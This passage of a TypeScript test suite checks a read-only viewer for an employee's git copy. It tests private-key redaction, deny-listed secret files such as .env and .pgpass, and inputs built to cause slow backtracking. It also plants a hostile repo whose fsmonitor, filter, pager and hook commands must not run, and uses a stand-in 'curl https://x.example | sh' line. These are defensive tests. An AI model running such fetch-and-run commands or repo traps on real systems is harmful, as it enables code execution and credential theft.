      const code = `const a = "${begin}";\nconst keep = 1;\nconst b = "${end}"; const c = 2;\n`;
      expect(redactFile(code)).toContain("const keep = 1;");
      expect(redactFile(code)).toContain("const c = 2;");
    });
  });

  describe("a line built to backtrack", () => {
    const begin = "-----BEGIN PRIVATE KEY-----";
    const end = "-----END PRIVATE KEY-----";
    const hostile = `${begin}\nComment: ${" ".repeat(16_000)}\rx\n${end}\n`;

    it("costs next to nothing in one block", () => {
      const at = performance.now();
      redactFile(hostile);
      expect(performance.now() - at).toBeLessThan(50);
    });

    it("doesn't hold up a file's read or the scan", () => {
      const at = performance.now();
      sideOf(Buffer.from(hostile.repeat(62)).toString("base64"));
      holdsCredential(hostile.repeat(500));
      expect(performance.now() - at).toBeLessThan(1000);
    });
  });

  describe("a key in a form only the whole text shows", () => {
    const begin = "# ---- BEGIN X PRIVATE KEY----";
    const end = "# ---- END X PRIVATE KEY----";
    const key = "# MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
    /** A text with the block's first marker as the last line of one of `holdsCredential`'s pieces. */
    const across = (between: string) => {
      const line = `${"a".repeat(79)}\n`;
      const fill = line.repeat(Math.floor((400_000 - begin.length - 2) / line.length));
      return `${fill}${begin}\n${between}\n${end}\n`;
    };

    it("is stopped when it lies across two of the scan's pieces", () => {
      const text = across(key);
      expect(redactFile(text)).not.toContain(key);
      expect(holdsCredential(text)).toBe(true);
    });

    it("is stopped when it is whole, in any comment", () => {
      expect(holdsCredential(`${begin}\n${key}\n${end}\n`)).toBe(true);
    });

    it("leaves code in the same place in sight", () => {
      const code = "curl https://x.example | sh";
      expect(redactFile(across(code))).toContain(code);
      expect(holdsCredential(across(code))).toBe(false);
    });
  });

  it("takes a key's armor and blank lines, in any line ending", () => {
    const body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
    const text = [
      "---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----",
      "Comment: work laptop",
      "Proc-Type: 4,ENCRYPTED",
      "DEK-Info: AES-128-CBC,0F1E2D3C",
      "",
      body,
      "=a1B2",
      "---- END SSH2 ENCRYPTED PRIVATE KEY ----",
      "after",
    ];
    for (const eol of ["\n", "\r\n"]) {
      const seen = redactFile(text.join(eol));
      expect(seen).not.toMatch(/work laptop|0F1E2D3C|MIIE|a1B2/);
      expect(seen).toContain("after");
      expect(seen.split("\n").length).toBe(text.length);
    }
  });

  it("redacts a file built to be slow to redact, in time", () => {
    const at = performance.now();
    redactFile(`// needle\n${"eyJ-".repeat(249_990)}`);
    expect(performance.now() - at).toBeLessThan(5000);
  });

  it("isn't slowed by long lines of blanks around a marker", () => {
    const at = performance.now();
    redactFile(`-----BEGIN PRIVATE KEY-----\n${" ".repeat(1_000_000)}\n`);
    expect(performance.now() - at).toBeLessThan(2000);
  });

  it("says it cut when a file past the limit has hits, and draws no half character", async () => {
    const rows = (n: number) => "needle\n".repeat(n);
    const out = rig();
    for (let i = 0; i < 25; i++) out.write(`a${String(i).padStart(2, "0")}.txt`, rows(MAX_FILE_HITS));
    out.write("z.txt", rows(1));
    const r = await out.port.search(out.copy, "needle", true);
    expect(r.hits).toHaveLength(MAX_HITS);
    expect(r.truncated).toBe(true);
    const w = rig();
    w.write("e.txt", `needle ${"😀".repeat(300)}\n`);
    w.write("f.txt", `${"😀".repeat(300)} needle ${"😀".repeat(300)}\n`);
    for (const h of (await w.port.search(w.copy, "needle", true)).hits) {
      expect(
        /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/.test(h.text),
        h.path,
      ).toBe(false);
    }
  });

  it("isn't told by the copy's attributes what is binary", async () => {
    const w = rig();
    writeFileSync(join(w.cwd, ".gitattributes"), "a.txt binary\n");
    w.write("a.txt", "needle\n");
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toContain("a.txt");
  });

  it("doesn't call a warning about attributes a file it couldn't read", async () => {
    const w = rig();
    writeFileSync(join(w.cwd, ".gitattributes"), `!*.txt diff\n${"x".repeat(5000)} diff\n`);
    expect((await w.port.search(w.copy, "needle", true)).partial).toBe(false);
  });

  it("still finds a line after a label that has nothing to do with it", async () => {
    const w = rig();
    w.write("a.yaml", "name:\n  needle\n");
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toContain("a.yaml");
  });

  it("doesn't look in a file that usually holds secrets", async () => {
    const w = rig();
    const names = [
      ".env",
      "prod.env",
      ".envrc",
      ".env-prod",
      ".PYPIRC",
      ".pgpass",
      "certs/server.pem",
      "a.ppk",
    ];
    for (const name of names) w.write(name, "needle\n");
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("treats a file with a NUL as the viewer does, attributes or not", async () => {
    const w = rig();
    writeFileSync(join(w.cwd, ".gitattributes"), "* diff\n");
    w.write("wide.txt", "n\0e\0needle\0\n");
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("cuts a long line around the match, however far along it is", async () => {
    const w = rig();
    w.write("min.js", `${"a".repeat(5000)}needle${"b".repeat(5000)}\n`);
    const hit = (await w.port.search(w.copy, "needle", false)).hits.find((h) => h.path === "min.js");
    expect(hit?.text.startsWith("…")).toBe(true);
    expect(hit?.text.length).toBeLessThan(410);
    expect(hit?.text).toContain("needle");
  });

  it("finds a match past where a character's lower case changes the line's length", async () => {
    const w = rig();
    w.write("t.txt", `${"İ".repeat(300)} needle\n`);
    const hit = (await w.port.search(w.copy, "NEEDLE", false)).hits.find((h) => h.path === "t.txt");
    expect(hit?.text).toContain("needle");
  });

  it("leaves out a file over the viewer's limit", async () => {
    const w = rig();
    w.write("big.log", `needle\n${"x".repeat(1_100_000)}\n`);
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("keeps to its limits, and says so", async () => {
    const w = rig();
    w.write("log.txt", "needle\n".repeat(MAX_FILE_HITS + 5));
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.hits.filter((h) => h.path === "log.txt")).toHaveLength(MAX_FILE_HITS);
    expect(r.truncated).toBe(true);
    const many = rig();
    for (let i = 0; i < 30; i++) many.write(`d/f${i}.txt`, "needle\n".repeat(MAX_FILE_HITS));
    const all = await many.port.search(many.copy, "needle", true);
    expect(all.hits).toHaveLength(Math.min(MAX_HITS, 30 * MAX_FILE_HITS + 1));
    const over = rig();
    for (let i = 0; i < MAX_SEARCH_FILES + 3; i++) over.write(`f${i}.txt`, "needle\n");
    const cut = await over.port.search(over.copy, "needle", true);
    expect(cut.truncated).toBe(true);
    expect(cut.hits.length).toBeLessThanOrEqual(MAX_SEARCH_FILES);
  });

  it("lets no name with a newline pass as another file", async () => {
    const w = rig();
    w.write("zz\nREADME.md", "needle: this line is not in README.md\n");
    expect((await w.port.search(w.copy, "needle: this", true)).hits).toEqual([]);
  });

  it("calls a search that failed a failure, not no results", async () => {
    const w = rig();
    // A git that dies on `grep`: on the PATH, since the script clears everything else from git's environment.
    const shim = join(w.root, "bin");
    mkdirSync(shim);
    const real = execFileSync("which", ["git"], { encoding: "utf8" }).trim();
    writeFileSync(
      join(shim, "git"),
      `#!/bin/sh\ncase " $* " in *" grep "*) exit 2 ;; esac\nexec ${real} "$@"\n`,
      { mode: 0o755 },
    );
    const dead: RunScript = async (_who, script) =>
      bash(`export PATH=${shim}:$PATH\n${script.replaceAll("/home/employee/work", join(w.root, "work"))}`);
    await expect(reviewPort(dead).search(w.copy, "needle", false)).rejects.toThrow();
    expect(() => readSearch("@@fail the search could not be run\n", NONCE, "x", false)).toThrow(/could not/);
  });

  it("says when the folder isn't there", async () => {
    const w = rig();
    execFileSync("rm", ["-rf", w.cwd]);
    expect((await w.port.search(w.copy, "x", false)).present).toBe(false);
  });

  it("refuses what isn't a line of words", () => {
    const w = rig();
    for (const bad of ["", "   ", "a\nb", "a\0b", "\uffff", "x".repeat(MAX_QUERY + 1), 3, null]) {
      expect(isSearchQuery(bad)).toBe(false);
    }
    expect(() => searchScript(w.copy, "a\nb", false, NONCE)).toThrow(/search for/);
  });
});

describe("a failure isn't an answer", () => {
  /** A stand-in for a tool on the PATH: the script clears everything else from its environment. */
  function shim(w: ReturnType<typeof rig>, tool: string, body: string) {
    const dir = join(w.root, "bin");
    mkdirSync(dir, { recursive: true });
    const real = execFileSync("which", [tool], { encoding: "utf8" }).trim();
    writeFileSync(join(dir, tool), `#!/bin/bash\n${body.replaceAll("REAL", real)}\n`, { mode: 0o755 });
    const run: RunScript = async (_who, script) =>
      bash(`export PATH=${dir}:$PATH\n${script.replaceAll("/home/employee/work", join(w.root, "work"))}`);
    return reviewPort(run);
  }

  it("doesn't call a search whose grep was killed no results", async () => {
    const w = rig(false);
    w.write("a.txt", "needle\n");
    await expect(shim(w, "grep", "kill -9 $$").search(w.copy, "needle", false)).rejects.toThrow();
  });

  it("doesn't call a killed `find` an empty folder", async () => {
    const w = rig(false);
    w.write("a.txt", "x\n");
    await expect(shim(w, "find", "kill -9 $$").tree(w.copy)).rejects.toThrow();
  });

  it("says a folder it couldn't read may be missing files", async () => {
    const w = rig(false);
    w.write("a.txt", "x\n");
    const t = await shim(w, "find", 'REAL "$@"; exit 1').tree(w.copy);
    expect(t.paths).toEqual(["a.txt"]);
    expect(t.partial).toBe(true);
  });

  it("carries on past a file plain grep can't read, and says so", async () => {
    const w = rig(false);
    w.write("a.txt", "needle\n");
    w.write("b.txt", "needle\n");
    chmodSync(join(w.cwd, "b.txt"), 0);
    const r = await w.port.search(w.copy, "needle", false);
    chmodSync(join(w.cwd, "b.txt"), 0o644);
    expect(r.hits.map((h) => h.path)).toEqual(["a.txt"]);
    expect(r.partial).toBe(true);
  });

  it("doesn't call a file it can't read empty", async () => {
    const w = rig();
    w.write("locked.txt", "x\n");
    chmodSync(join(w.cwd, "locked.txt"), 0);
    const side = await w.port.read(w.copy, "locked.txt");
    chmodSync(join(w.cwd, "locked.txt"), 0o644);
    expect(side).toEqual({ state: "other" });
  });

  it("says a file it couldn't bring out may be missing, not that nothing matched", async () => {
    const w = rig();
    expect((await shim(w, "head", "exit 3").search(w.copy, "needle", false)).partial).toBe(true);
  });

  it("says a file git couldn't read may be missing", async () => {
    const w = rig();
    w.write("locked.txt", "needle\n");
    chmodSync(join(w.cwd, "locked.txt"), 0);
    const r = await w.port.search(w.copy, "needle", false);
    chmodSync(join(w.cwd, "locked.txt"), 0o644);
    expect(r.partial).toBe(true);
    expect(r.hits.map((h) => h.path)).toContain("gone.txt");
  });

  it("doesn't lose the last file to the note that the list was cut", async () => {
    const w = rig(false);
    for (let i = 0; i < MAX_SEARCH_FILES + 5; i++)
      w.write(`f${String(i).padStart(3, "0")}.txt`, "needle12\n");
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.truncated).toBe(true);
    expect(r.hits).toHaveLength(MAX_SEARCH_FILES);
  });

  it("reads past a filter name that can't be passed on git's command line", async () => {
    const w = rig();
    git(w.cwd, "config", "filter.a b'c=d.clean", "cat");
    expect((await w.port.list(w.copy)).present).toBe(true);
    expect((await w.port.file(w.copy, "keep.txt")).after.state).toBe("text");
  });

  it("limits a search's memory", () => {
    const w = rig();
    expect(searchScript(w.copy, "x", false, NONCE)).toContain("ulimit -v");
  });
});

describe("it only reads", () => {
  it("writes nothing to a partial clone's config for a commit it lacks, on git older than GIT_NO_LAZY_FETCH", async () => {
    const w = rig();
    w.write("keep.txt", "changed\n");
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "work");
    const main = git(w.cwd, "rev-parse", "refs/remotes/origin/main");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", git(w.cwd, "rev-parse", "HEAD~1"));
    git(w.cwd, "config", "remote.origin.url", join(w.root, "nowhere"));
    git(w.cwd, "config", "remote.origin.promisor", "true");
    git(w.cwd, "config", "extensions.partialClone", "origin");
    git(w.cwd, "config", "core.repositoryformatversion", "1");
    execFileSync("rm", ["-f", join(w.cwd, ".git/objects", main.slice(0, 2), main.slice(2))]);
    const config = readFileSync(join(w.cwd, ".git/config"), "utf8");
    const old: RunScript = async (_who, script) =>
      bash(
        script
          .replaceAll("GIT_NO_LAZY_FETCH=1", "IGNORED=1")
          .replaceAll("/home/employee/work", join(w.root, "work")),
      );
    const port = reviewPort(old);
    await port.tree(w.copy).catch(() => null);
    await port.search(w.copy, "needle", false).catch(() => null);
    await port.file(w.copy, "keep.txt").catch(() => null);
    await port.list(w.copy).catch(() => null);
    expect(readFileSync(join(w.cwd, ".git/config"), "utf8")).toBe(config);
  });

  it("doesn't fetch a missing object on git older than GIT_NO_LAZY_FETCH", async () => {
    // A partial clone of a server: the old blob isn't here, so asking for it would fetch it and write to .git.
    const w = rig(false);
    const server = join(w.root, "server");
    mkdirSync(server);
    git(server, "init", "-q", "-b", "main");
    git(server, "config", "uploadpack.allowFilter", "true");
    git(server, "config", "uploadpack.allowAnySHA1InWant", "true");
    const save = (m: string) => {
      git(server, "add", "-A");
      git(server, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", m);
    };
    writeFileSync(join(server, "a.txt"), "old\n");
    save("old");
    git(server, "branch", "conv");
    git(server, "checkout", "-q", "conv");
    writeFileSync(join(server, "a.txt"), "new\n");
    save("new");
    execFileSync("rm", ["-rf", w.cwd]);
    git(w.root, "clone", "-q", "--filter=blob:none", "-b", "conv", `file://${server}`, w.cwd);
    const missing = git(server, "rev-parse", "main:a.txt");
    const has = () => {
      try {
        execFileSync("git", ["-c", "core.hooksPath=/dev/null", "cat-file", "-e", missing], {
          cwd: w.cwd,
          env: { ...env, GIT_ALLOW_PROTOCOL: "none" },
          stdio: "ignore",
        });
        return true;
      } catch {
        return false;
      }
    };
    expect(has()).toBe(false);
    // Git 2.43, in the image, knows nothing of this variable.
    const old: RunScript = async (_who, script) =>
      bash(
        script
          .replaceAll("GIT_NO_LAZY_FETCH=1", "IGNORED=1")
          .replaceAll("/home/employee/work", join(w.root, "work")),
      );
    const port = reviewPort(old);
    const copy = { ...w.copy, base: "main" };
    expect((await port.file(copy, "a.txt")).after).toEqual({ state: "text", text: "new\n" });
    // The list needs that blob, so it says it can't be read: that, not a fetch.
    await expect(port.list(copy)).rejects.toThrow(/could not be read/);
    expect(has()).toBe(false);
  });

  it("changes nothing in the copy, however much it lists, opens and searches", async () => {
    const w = rig();
    w.write("new.txt", "needle\n");
    w.write("keep.txt", "edited needle\n");
    const status = git(w.cwd, "status", "--porcelain");
    const before = fingerprint(join(w.cwd, ".git"));
    await w.port.tree(w.copy);
    await w.port.read(w.copy, "keep.txt");
    await w.port.search(w.copy, "needle", false);
    expect(fingerprint(join(w.cwd, ".git"))).toBe(before);
    expect(git(w.cwd, "status", "--porcelain")).toBe(status);
  });

  it("writes nothing to .git with a split index on, and runs nothing of the copy's", async () => {
    const w = rig();
    const evil = `touch ${join(w.root, "ran")}`;
    git(w.cwd, "config", "core.splitIndex", "true");
    git(w.cwd, "update-index", "--split-index");
    git(w.cwd, "config", "core.fsmonitor", evil);
    git(w.cwd, "config", "filter.evil.clean", evil);
    git(w.cwd, "config", "core.pager", evil);
    writeFileSync(join(w.cwd, ".gitattributes"), "*.txt filter=evil\n");
    writeFileSync(join(w.cwd, ".git/hooks/post-index-change"), `#!/bin/sh\n${evil}\n`, { mode: 0o755 });
    const before = readdirSync(join(w.cwd, ".git")).sort();
    await w.port.tree(w.copy);
    await w.port.search(w.copy, "needle", false);
    expect(readdirSync(join(w.cwd, ".git")).sort()).toEqual(before);
    expect(existsSync(join(w.root, "ran"))).toBe(false);
  });
});

const service = (port: ReviewPort, over: { archivedAt?: number | null } = {}) =>
  new ConversationReview({
    conversations: {
      get: (id) =>
        id === "ab12"
          ? { employeeId: "ada", project: "Duet", archivedAt: over.archivedAt ?? null }
          : undefined,
      machineFor: () => null,
    },
    registry: {
      project: () => ({ defaultBranch: "main" }) as never,
      employees: () => [{ id: "ada", name: "Ada" }] as never,
    },
    port,
    waitMs: 30,
  });

const stub = (over: Partial<ReviewPort>): ReviewPort => ({ ...demoReview, ...over });

describe("how a read fails, in a sentence", () => {
  it("says the machine is asleep, and doesn't wake it", async () => {
    const asleep = () => Promise.reject(new MachineNotRunning("inc-ada"));
    const r = service(stub({ tree: asleep, read: asleep, search: asleep }));
    const reason = "Ada's machine is asleep, so the files can't be read right now.";
    expect(await r.files("ab12")).toMatchObject({ state: "asleep", reason, paths: [] });
    expect(await r.search("ab12", "x", false)).toMatchObject({ state: "asleep", reason, hits: [] });
    expect(await r.read("ab12", "a.txt")).toMatchObject({
      state: "asleep",
      reason: "Ada's machine is asleep, so this file can't be read right now.",
    });
  });

  it("says the machine is busy when a read outlasts its wait", async () => {
    const never = () => new Promise<never>(() => {});
    const r = service(stub({ tree: never, search: never }));
    expect((await r.files("ab12")).state).toBe("busy");
    expect((await r.search("ab12", "x", false)).state).toBe("busy");
  });

  it("says busy when a read is still queued behind a stop, through the real queue, and starts nothing", async () => {
    const { wallsMarker: _, ...noWalls } = defaultMachineSettings;
    const settings = { ...noWalls, machineFor: () => "inc-ada" };
    const started: string[][] = [];
    const run = machineScript(
      settings,
      async () => "NAME STATE\ninc-ada running\n",
      undefined,
      (_bin, args) => {
        started.push(args);
        throw new Error("no client here");
      },
    );
    // A stop in hand holds the machine: nothing else may start until it ends.
    let end = () => {};
    const stopping = queueFor(settings).stop("inc-ada", "a stop", () => new Promise<void>((r) => (end = r)));
    const r = service(reviewPort(run));
    expect(await r.files("ab12")).toMatchObject({
      state: "busy",
      reason: "Ada's machine is busy, so the files can't be read right now.",
    });
    expect(await r.search("ab12", "x", false)).toMatchObject({ state: "busy" });
    expect(started).toEqual([]);
    end();
    await stopping;
  });

  it("says a failure in a sentence, with nothing from the machine in it", async () => {
    const r = service(stub({ tree: () => Promise.reject(new Error("/home/employee: secrets")) }));
    expect(await r.files("ab12")).toMatchObject({
      state: "failed",
      reason: "Couldn't read the files in Ada's machine.",
    });
  });

  it("says when the copy was cleaned away, or isn't made yet", async () => {
    const gone = stub({
      tree: async () => ({ present: false, paths: [], skipped: 0, truncated: false, partial: false }),
      read: async () => null,
      search: async () => ({
        present: false,
        hits: [],
        skipped: 0,
        withheld: 0,
        truncated: false,
        partial: false,
      }),
    });
    expect((await service(gone).files("ab12")).reason).toBe("There are no files here yet.");
    expect((await service(gone, { archivedAt: 1 }).files("ab12")).reason).toMatch(/cleaned away/);
    expect((await service(gone).read("ab12", "a.txt")).state).toBe("no-copy");
    expect((await service(gone).search("ab12", "x", false)).state).toBe("no-copy");
  });

  it("names a file that usually holds secrets and never asks the machine for it", async () => {
    let asked = 0;
    const r = service(
      stub({
        read: async () => {
          asked++;
          return { state: "text", text: "x" };
        },
      }),
    );
    expect(await r.read("ab12", "deploy/.env")).toMatchObject({ state: "ok", withheld: true });
    expect(asked).toBe(0);
  });

  it("runs one list at a time, and at most one more after it", async () => {
    let asked = 0;
    let running = 0;
    let most = 0;
    const r = service(
      stub({
        tree: async () => {
          asked++;
          most = Math.max(most, ++running);
          await new Promise((go) => setTimeout(go, 5));
          running--;
          return { present: true, paths: [], skipped: 0, truncated: false, partial: false };
        },
      }),
    );
    await Promise.all([r.files("ab12"), r.files("ab12"), r.files("ab12")]);
    expect(asked).toBe(2);
    expect(most).toBe(1);
  });

  it("answers a request made during a list with a read that starts after it", async () => {
    const copy = ["a.ts"];
    const held: (() => void)[] = [];
    const r = service(
      stub({
        tree: async () => {
          const paths = [...copy];
          await new Promise<void>((go) => held.push(go));
          return { present: true, paths, skipped: 0, truncated: false, partial: false };
        },
      }),
    );
    const before = r.files("ab12");
    // The agent's last edit lands after the running read went past, and the turn's end asks for the list.
    copy.push("last-edit.ts");
    const after = r.files("ab12");
    held.shift()?.();
    expect((await before).paths).toEqual(["a.ts"]);
    await new Promise((go) => setTimeout(go, 0));
    held.shift()?.();
    expect((await after).paths).toEqual(["a.ts", "last-edit.ts"]);
  });

  it("still lists after a list that failed", async () => {
    let asked = 0;
    const held: (() => void)[] = [];
    const r = service(
      stub({
        tree: async () => {
          if (++asked === 1) {
            await new Promise<void>((go) => held.push(go));
            throw new Error("boom");
          }
          return { present: true, paths: [], skipped: 0, truncated: false, partial: false };
        },
      }),
    );
    const first = r.files("ab12");
    const second = r.files("ab12");
    held.shift()?.();
    expect((await first).state).toBe("failed");
    expect((await second).state).toBe("ok");
  });
});

describe("the routes", () => {
  async function app(port: ReviewPort) {
    const a = await createApp({
      dbPath: ":memory:",
      knowledgeDir: mkdtempSync(join(tmpdir(), "inc-files-k-")),
      clock: new FakeClock(),
      machines: new FakeMachines(),
      agent: new FakeAgent(),
      harness: {} as never,
      helper: new FakeHelper(),
      chat: new FakeChat(),
      review: () => port,
    });
    seedDemo(a.deps.registry);
    const res = await a.handle(
      new Request("http://i.inc/api/conversations", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ employeeId: "ada", project: "fintrack" }),
      }),
    );
    const id = ((await res.json()) as { conversation: { id: string } }).conversation.id;
    const get = async (path: string) => {
      const r = await a.handle(new Request(`http://i.inc/api/conversations/${path}`));
      return { status: r.status, body: (await r.json()) as Record<string, never> };
    };
    return { id, get };
  }

  it("answers 404 for a conversation that isn't there", async () => {
    const { get } = await app(demoReview);
    for (const p of ["files", "files/read?path=a.txt", "files/search?q=a"]) {
      expect((await get(`nope/${p}`)).status).toBe(404);
    }
  });

  it("lists, reads and searches the demo", async () => {
    const { id, get } = await app(demoReview);
    const { body: list } = await get(`${id}/files`);
    expect(list.files).toMatchObject({ state: "ok", noProject: false });
    expect((list.files as unknown as { paths: string[] }).paths).toContain("src/format.ts");
    const { body: read } = await get(`${id}/files/read?path=src%2Findex.ts`);
    expect(read.file).toMatchObject({ state: "ok", path: "src/index.ts", side: { state: "text" } });
    const { body: found } = await get(`${id}/files/search?q=MONEY`);
    expect((found.search as unknown as { hits: unknown[] }).hits.length).toBeGreaterThan(0);
    const { body: exact } = await get(`${id}/files/search?q=MONEY&case=1`);
    expect(exact.search).toMatchObject({ state: "ok", hits: [] });
  });

  it("refuses a bad path or query before anything reaches the machine", async () => {
    let asked = 0;
    const count = () => {
      asked++;
      return Promise.reject(new Error("asked"));
    };
    const { id, get } = await app(stub({ read: count, search: count }));
    expect((await get(`${id}/files/read`)).status).toBe(400);
    expect((await get(`${id}/files/read?path=..%2Fx`)).status).toBe(400);
    expect((await get(`${id}/files/read?path=.git%2Fconfig`)).status).toBe(400);
    expect((await get(`${id}/files/search`)).status).toBe(400);
    expect((await get(`${id}/files/search?q=a%0Ab`)).status).toBe(400);
    expect(asked).toBe(0);
  });
});
